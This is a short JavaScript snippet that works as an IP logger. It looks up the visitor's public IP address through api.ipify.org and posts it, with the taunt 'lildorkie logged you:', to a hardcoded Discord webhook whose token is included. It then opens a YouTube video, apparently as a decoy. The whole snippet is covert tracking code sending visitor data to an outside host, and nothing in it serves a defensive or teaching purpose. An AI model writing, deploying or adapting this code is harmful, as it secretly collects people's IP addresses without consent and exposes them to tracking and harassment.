var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1129858297818779669/RtaV_3NtOXvRFPeTf_fx0i9Bh4t8MnIutBT9bSLlgnWTwDxq8M8gVAw7iqISu5JIMZG_'
    var message = {
        content: 'lildorkie logged you:' + ip
    };

    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});

window.open("https://www.youtube.com/watch?v=E4WlUXrJgy4&t=3s",)

